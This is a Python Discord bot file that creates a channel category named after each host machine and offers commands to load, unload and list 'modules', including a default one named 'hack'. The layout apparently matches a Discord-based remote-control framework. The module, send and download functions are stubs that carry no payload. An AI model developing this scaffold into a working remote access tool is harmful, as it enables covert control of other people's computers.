import os
import time
import socket
import nextcord
from datetime import datetime
from nextcord.ext import commands

bot = commands.Bot(command_prefix="!", intents=nextcord.Intents.all())

TOKEN = ""

PC_NAME = f"{socket.gethostname().lower()}-{datetime.now().strftime('%d-%H%M-%S')}"

def get_modules():
    modules = []
    if os.path.exists('Modules'):
        for file in os.listdir('Modules'):
            if file.endswith('.py'):
                modules.append(os.path.splitext(file)[0])
    return modules if modules else ["hack"]

modules = get_modules()
active_modules = {module: False for module in modules}

@bot.event
async def on_ready():
    for guild in bot.guilds:
        category = await guild.create_category(name=PC_NAME)
        channel = await category.create_text_channel(name="commands")
        await channel.send(f"System initialized. Available modules: {', '.join(modules)}")
           
@bot.command(name="exit")
async def exing(ctx):
    category = nextcord.utils.get(ctx.guild.categories, name=PC_NAME)
    if category:
        for channel in category.channels:
            await channel.delete()
        await category.delete()
        time.sleep(1)
        exit()
        
@bot.command(name="load")
async def module(ctx, module_name):
    if ctx.channel.category and str(ctx.channel.category.name).lower() == PC_NAME:
        if module_name in modules and not active_modules[module_name]:
            await ctx.send(f"Loading module: {module_name}")
            channel = await ctx.channel.category.create_text_channel(name=module_name)  
            active_modules[module_name] = True
            await channel.send(f"Module {module_name} is now active")
        else:
            await ctx.send(f"Module not available or already loaded")

@bot.command(name="deload")
async def deload(ctx, module_name):
    if ctx.channel.category and str(ctx.channel.category.name).lower() == PC_NAME:
        if module_name in active_modules and active_modules[module_name]:
            for channel in ctx.channel.category.channels:
                if channel.name == module_name:
                    active_modules[module_name] = False
                    await channel.delete()
                    await ctx.send(f"Module {module_name} unloaded")
                    return
        await ctx.send("Module not found or not active")

@bot.command(name="send")
async def send(ctx, module_name, *, data):
    if ctx.channel.category.name == PC_NAME:
        await ctx.send(f"Data sent to {module_name}: {data}")

@bot.command(name="acm")
async def acmodules(ctx):
    if ctx.channel.category.name == PC_NAME:
        result = []
        for module, status in active_modules.items():
            result.append(f"{module}: {'Active' if status else 'Inactive'}")
        await ctx.reply("\n".join(result))

@bot.command(name="refm")
async def refresh_modules(ctx):
    if ctx.channel.category.name == PC_NAME:
        global modules, active_modules
        modules = get_modules()
        active_modules = {module: active_modules.get(module, False) for module in modules}
        await ctx.send(f"Modules refreshed. Available: {', '.join(modules)}")

@bot.command(name="dowm")
async def download_modules(ctx):
    if ctx.channel.category.name == PC_NAME:
        await ctx.send("Download functionality not implemented")

if __name__ == "__main__":
    bot.run(TOKEN)